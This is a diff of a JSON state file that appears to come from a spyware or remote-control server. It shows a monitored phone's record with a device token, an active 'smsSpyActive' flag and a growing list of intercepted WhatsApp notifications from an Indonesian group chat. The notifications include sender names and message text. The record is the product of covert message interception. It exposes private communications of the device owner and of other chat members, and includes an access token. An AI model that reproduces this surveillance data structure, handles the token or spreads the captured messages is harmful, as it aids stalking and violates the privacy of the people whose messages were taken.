@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044220247,
+    "lastSeen": 1775044221315,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13075 pesan): ~ sʏʀɪɴɴ",
+        "content": ".brat kitak main?",
+        "time": "01/04 19:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044222171
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15339 pesan dari 10 chat",
+        "time": "01/04 19:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044220603
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13073 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 19:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044220574
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13072 pesan): ~ Dapa",
@@ -3995,30 +4019,6 @@
         "time": "01/04 19:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1775043686495
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15195 pesan dari 10 chat",
-        "time": "01/04 19:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043678743
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12916 pesan): ~ airen anak orang",
-        "content": "Yey",
-        "time": "01/04 19:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043678656
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15194 pesan dari 10 chat",
-        "time": "01/04 19:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775043670274
       }
     ],
     "galleryPhotos": [],
